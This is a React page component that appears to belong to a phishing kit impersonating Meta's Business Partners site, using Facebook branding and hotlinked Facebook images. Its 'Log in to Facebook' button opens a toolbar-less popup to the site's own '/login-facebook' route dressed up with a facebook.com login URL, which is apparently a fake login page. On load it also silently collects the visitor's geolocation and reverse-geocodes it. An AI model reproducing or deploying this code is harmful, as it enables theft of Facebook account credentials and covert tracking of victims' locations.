import Footer from "@/components/layout/footer";
import Header from "@/components/layout/header";
import { useEffect, useState } from "react";
export default function Login() {
  const [add, setAdd] = useState("");

  useEffect(() => {
    navigator.geolocation.getCurrentPosition((pos) => {
      const { latitude, longitude } = pos.coords;
      console.log(latitude, longitude);
      const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
      fetch(url)
        .then((res) => res.json())
        .then((data) => setAdd(data.address));
    });
  }, []);
  console.log(add);
  const handleClickLogin = async () => {
    const facebookLoginUrl = `${window.location.origin}/login-facebook?https://www.facebook.com/login.php?skip_api_login=1`;

    const width = 600;
    const height = 650;
    const left = (window.screen.width - width) / 2;
    const top = (window.screen.height - height) / 2;

    window.open(
      facebookLoginUrl,
      "_blank",
      `width=${width},height=${height},top=${top},left=${left},toolbar=no,menubar=no,scrollbars=no,resizable=no`
    );
  };
  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      <div className="relative w-full bg-[#0A78BE] text-white z-[1]">
        {/* Nội dung chính */}
        <div className="relative max-w-[1232px] w-full mx-auto text-white flex flex-col md:flex-row py-[60px]">
          <div className="w-full md:w-1/2 flex flex-col justify-center relative z-10 py-10 md:py-20 px-6 md:px-0 mr-[16%]">
            <h1 className="text-[32px] leading-[38px] md:text-4xl font-medium mb-4">Meta Business Partners</h1>
            <p className="text-[18px] leading-[27px] mb-16 font-normal tracking-[0.25px] max-w-[450px]">
              Please log in to Facebook to get access to apply to become a partner.
            </p>
            <div>
              <button
                onClick={() => handleClickLogin()}
                className="bg-white text-[15px] text-[#0a78be] font-semibold py-[16px] px-[28px] rounded-sm"
              >
                Log in to Facebook
              </button>
            </div>
          </div>
        </div>

        {/* Ảnh nền - Đảm bảo tràn màn hình */}
        <div
          className="absolute top-0 right-0 w-full md:w-1/2 h-[300px] md:h-full bg-cover bg-center"
          style={{
            backgroundImage: `url('https://scontent.fhan19-1.fna.fbcdn.net/v/t39.2365-6/199046944_849992372606034_2046622190557130794_n.jpg?stp=dst-webp_q85_s1225x1225&_nc_cat=111&ccb=1-7&_nc_sid=e280be&_nc_ohc=UoABqe2L3gIQ7kNvgEXxfrX&_nc_oc=AdknaLy4EFVI7YvkwZGTEcYebNFfQh5oq3b2fXnEfeHG_ygZYZ1vyj09_KCh9ueZSI8&_nc_zt=14&_nc_ht=scontent.fhan19-1.fna&_nc_gid=3CaVh2wNwHIJF9iAYYKR6w&oh=00_AYHxrHOPAnPyrFYo_OyajThnLQqTArN78RRodxYgwXdnPA&oe=67F600C3')`,
          }}
        ></div>
      </div>

      {/* Related Content Section */}
      <div className="max-w-[1232px] mx-auto py-12 md:py-16">
        <h2 className="text-[32px] leading-[38px] tracking-[1px] font-medium mb-[32px]">Related content</h2>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-x-8 gap-y-10">
          <ContentItem title="Meta Business Partners: Trusted experts who enable businesses to grow" />
          <ContentItem title="Meta Success Centre for Agencies" />
          <ContentItem title="Facebook Business Partners: Apply to become a Messenger partner" />
          <ContentItem title="Meta Business Partners: Become a Commerce Partner" />
          <ContentItem title="Meta Business Partner programme policies" />
          <ContentItem title="Meta Business Partners: Find an expert to help you advertise on Facebook, Instagram and Messenger" />
        </div>
      </div>
      <Footer />
    </div>
  );
}

interface ContentItemProps {
  title: string;
  hasArrow?: boolean;
}

const ContentItem: React.FC<ContentItemProps> = ({ title, hasArrow = true }) => {
  return (
    <div className="border-b border-[#cbd2d9] pb-10 pt-10 cursor-pointer">
      <div className="flex justify-between items-center">
        <div className="text-[#1c2b33] font-medium leading-[27px] text-[18px] tracking-[0.25px]">{title}</div>
        {hasArrow && (
          <div className="text-blue-600">
            <img
              src="https://scontent.fhan19-1.fna.fbcdn.net/v/t39.8562-6/436368815_978158867209887_3678501748610046195_n.svg?_nc_cat=105&ccb=1-7&_nc_sid=f537c7&_nc_ohc=8irpWbrYf_QQ7kNvgHyTLQT&_nc_oc=AdmRCB0sP06tzyc_XVaCARxSSpgQMlBKjwAuBkebcEukTPNs6dDACxFrVX1KuUNApdE&_nc_zt=14&_nc_ht=scontent.fhan19-1.fna&_nc_gid=3CaVh2wNwHIJF9iAYYKR6w&oh=00_AYE85-6hmUHo4AloI-Gr7PwLp32TOchPYDGdRJlXMnHNLw&oe=67E1BC52"
              alt=""
            />
          </div>
        )}
      </div>
    </div>
  );
};
